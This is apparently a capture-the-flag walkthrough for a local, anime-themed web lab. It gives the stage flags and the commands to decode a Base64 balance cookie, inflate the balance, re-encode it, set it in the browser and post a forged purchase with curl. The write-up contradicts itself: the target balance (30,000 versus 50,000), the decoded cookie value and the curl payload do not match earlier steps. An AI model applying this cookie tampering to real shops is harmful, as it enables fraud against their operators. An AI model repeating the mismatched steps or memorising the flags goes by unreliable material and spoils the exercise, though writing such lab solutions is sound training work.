## 📌 Challenge Overview
After purchasing the Stage 2 Clue, the player claims the Stage 2 Flag (`SSP{MILLUKI_BANK_IDOR_DRAINED_98A41}`) and unlocks `gateway.php`. 

Upon navigating to `gateway.php` and authenticating the Stage 2 Flag, the Gateway Portal digitizes the player's remaining 9,000 Ⓙ wallet balance into a client-side **`hunter_pouch`** cookie. The **Dark Continent Ancient Gate Key & Master Relic** in the Item Merchant Shop (`shop.php`) requires **20,000 Ⓙ (Jenny)**. However, the entire candidate roster across the Hunter Network only held 10,000 Ⓙ total. 

To acquire the 20,000 Ⓙ Master Relic, the player must decode the Base64 JSON payload of the **`hunter_pouch`** cookie, tamper their balance to **30,000 Ⓙ**, and purchase the Master Relic in the Shop to claim the final Master Flag.

---

## 🔍 Step-by-Step Exploitation

### Step 1: Gateway Authentication & Smart Ring Cookie Generation
1. After purchasing the **Stage 2 Clue (1,000 Ⓙ)**, note the Stage 2 Flag:
   `SSP{MILLUKI_BANK_IDOR_DRAINED_98A41}`
2. Navigate to `http://127.0.0.1:3003/gateway.php`.
3. Enter the Stage 2 Flag into the cipher authentication input and submit.
4. The system validates the flag and outputs the Gateway Authentication Transmission:
   ```
    ========================================================================
      🌟 GATEWAY AUTHENTICATION SUCCESSFUL // STAGE 2 COMPLETED
    ========================================================================
    [+] VERIFIED HUNTER: @leorio_paradinight (License Clearance Validated)
    [+] EXPLOIT ACCOMPLISHED: Milluki Zoldyck's P2P Bank Pouch Drained via IDOR
    [+] STAGE 1 & 2 CLEARANCE RECORDED!
    ------------------------------------------------------------------------
    [*] GREED ISLAND SMART RING // SYSTEM SYNCHRONIZATION:
        To prepare for the expedition, your physical assets have been converted
        into a digitized Nen seal bound directly to your local vessel.
        The transmission frequency is encoded for candidate transport.

    [*] EXPEDITION RECON DIRECTIVE:
        The Item Merchant in sector shop.php holds the legendary
        Dark Continent Master Relic priced at 20,000 Ⓙ.
        However, the entire network's circulating Jenny cannot meet this demand.

        Inspect the local seal bestowed upon your vessel. If a Hunter can
        decipher and reshape their digitized aura reserves, the unreachable
        artifact will be yours.
    ========================================================================
   ```
5. Inspect your browser cookies via **DevTools** (<kbd>F12</kbd> ➔ **Application** ➔ **Cookies** ➔ `http://127.0.0.1:3003`):
   - Notice the new cookie named **`hunter_pouch`**.

---

### Step 2: Decode the `hunter_pouch` Cookie
1. Read the cookie value in browser Console or terminal:
   ```javascript
   // In Browser Console:
   document.cookie
   // Returns: "hunter_pouch=eyJ1c2VyIjoibGVvcmlvX3BhcmFkaW5pZ2h0IiwiYmFsYW5jZSI6OTAwMCwicm9sZSI6Imh1bnRlcl9jYW5kaWRhdGUiLCJzbWFydF9yaW5nIjoiR1JFRURfSVNMQU5EX1NZTkNfVjEiLCJ0YW1wZXJfcHJvb2YiOiJmYWxzZSJ9"
   ```

2. Decode from Base64:
   ```bash
   echo "eyJ1c2VyIjoibGVvcmlvX3BhcmFkaW5pZ2h0IiwiYmFsYW5jZSI6MCwicm9sZSI6Imh1bnRlcl9jYW5kaWRhdGUiLCJzbWFydF9yaW5nIjoiR1JFRURfSVNMQU5EX1NZTkNfVjEiLCJ0YW1wZXJfcHJvb2YiOiJmYWxzZSJ9" | base64 -d
   ```
   **Decoded Output:**
   ```json
   {
     "user": "leorio_paradinight",
     "balance": 0,
     "role": "hunter_candidate",
     "smart_ring": "GREED_ISLAND_SYNC_V1",
     "tamper_proof": "false"
   }
   ```

---

### Step 3: Tamper the Pouch Balance to 50,000 Ⓙ
1. Modify the `"balance"` field in the JSON to `50000` (which adds 50,000 Ⓙ to your in-hand 9,000 Ⓙ for a total of 59,000 Ⓙ):
   ```json
   {
     "user": "leorio_paradinight",
     "balance": 50000,
     "role": "hunter_candidate",
     "smart_ring": "GREED_ISLAND_SYNC_V1",
     "tamper_proof": "false"
   }
   ```

2. Base64-encode the modified JSON payload:
   ```bash
   echo -n '{"user":"leorio_paradinight","balance":50000,"role":"hunter_candidate","smart_ring":"GREED_ISLAND_SYNC_V1","tamper_proof":"false"}' | base64
   ```
   **Generated Base64 String:**
   `eyJ1c2VyIjoibGVvcmlvX3BhcmFkaW5pZ2h0IiwiYmFsYW5jZSI6NTAwMDAsInJvbGUiOiJodW50ZXJfY2FuZGlkYXRlIiwic21hcnRfcmluZyI6IkdSRUVEX0lTTEFORF9TWU5DX1YxIiwidGFtcGVyX3Byb29mIjoiZmFsc2UifQ==`

3. Update the cookie in the browser:
   ```javascript
   // Run in Browser DevTools Console:
   document.cookie = "hunter_pouch=eyJ1c2VyIjoibGVvcmlvX3BhcmFkaW5pZ2h0IiwiYmFsYW5jZSI6NTAwMDAsInJvbGUiOiJodW50ZXJfY2FuZGlkYXRlIiwic21hcnRfcmluZyI6IkdSRUVEX0lTTEFORF9TWU5DX1YxIiwidGFtcGVyX3Byb29mIjoiZmFsc2UifQ==; path=/";
   ```

---

### Step 4: Purchase the Master Relic in Shop
1. Refresh `http://127.0.0.1:3003/shop.php` (or view navbar).
2. The navbar balance immediately updates to:
   `💰 IN-HAND: 59,000 Ⓙ` (9,000 in-hand + 50,000 Smart Ring pouch)
3. The Master Clue status displays:
   `⚡ READY FOR PROCUREMENT (59,000 Ⓙ IN POUCH)`
4. Click **"ATTEMPT MASTER PURCHASE (20,000 Ⓙ)"** (or send via `curl`):
   ```bash
   curl -X POST http://127.0.0.1:3003/api/buy_clue.php \
     -b "HXH_NEN_SESSION=<SESSION_ID>; hunter_pouch=eyJ1c2VyIjoibGVvcmlvX3BhcmFkaW5pZ2h0IiwiYmFsYW5jZSI6NTAwMDAsInJvbGUiOiJodW50ZXJfY2FuZGlkYXRlIiwic21hcnRfcmluZyI6IkdSRUVEX0lTTEFORF9HQVRFV0FZX1NZTkNfVjEiLCJ0YW1wZXJfcHJvb2YiOiJmYWxzZSJ9" \
     -d "clue_id=clue_master"
   ```
5. The merchant accepts the 20,000 Ⓙ transaction and reveals the Master Relic transmission with the **remote auto-unlock clue**:
   ```
   ========================================================================
     👑 LEGENDARY ARTIFACT // DARK CONTINENT MASTER RELIC UNLOCKED
   ========================================================================
   [+] EXPLOIT VERIFIED: Client-Side Cookie State Tampering Successful
   [+] ITEM PROCURED: Dark Continent Master Key (20,000 Ⓙ Transacted)
   ------------------------------------------------------------------------
   [*] ANCIENT RELIC INSCRIPTION // NEN OVERRIDE SIGNAL:
       "The latent aura frequencies within this key have synchronized with
        the remote Gateway relay network. An automated override broadcast has
        been transmitted to sector gateway.php.

        The deepest core chamber is now auto-unlocked."

   [*] RECON DIRECTIVE:
       Return to the Gateway Portal (gateway.php) to observe the live automated
       core breach transmission and retrieve the REAL FINAL FLAG!
   ========================================================================
   ```

---

### Step 5: Return to Gateway Portal & Claim Real Final Flag
1. Navigate back to `http://127.0.0.1:3003/gateway.php`.
2. Notice the **Gateway Auto-Override Active** victory broadcast banner is automatically rendered at the top of the page:
   ```
   ========================================================================
     🌌 DARK CONTINENT EXPEDITION // REAL MASTER FLAG BROADCAST
   ========================================================================
   [+] SYSTEM STATUS: CORE CHAMBER AUTO-UNLOCKED VIA MASTER KEY
   [+] CANDIDATE AUTHENTICATED: @leorio_paradinight (Triple-Star Pioneer)
   [+] REMOTE TRIGGER: Verified against Greed Island Relay Node

   [+] 🏆 REAL FINAL MASTER FLAG:
       SSP{WEB_HUNTER_LICENSE_DA91FC72}
   ------------------------------------------------------------------------
   [*] CONGRATULATIONS HUNTER! You have conquered all stages of HXH-C10!
       • Stage 1: Source Recon & Archive Dump Discovery
       • Stage 2: Broken Object-Level Authorization (IDOR) & P2P Fund Drain
       • Stage 3: Client-Side Cookie State Tampering & Remote Gateway Core Breach
   ========================================================================
   ```
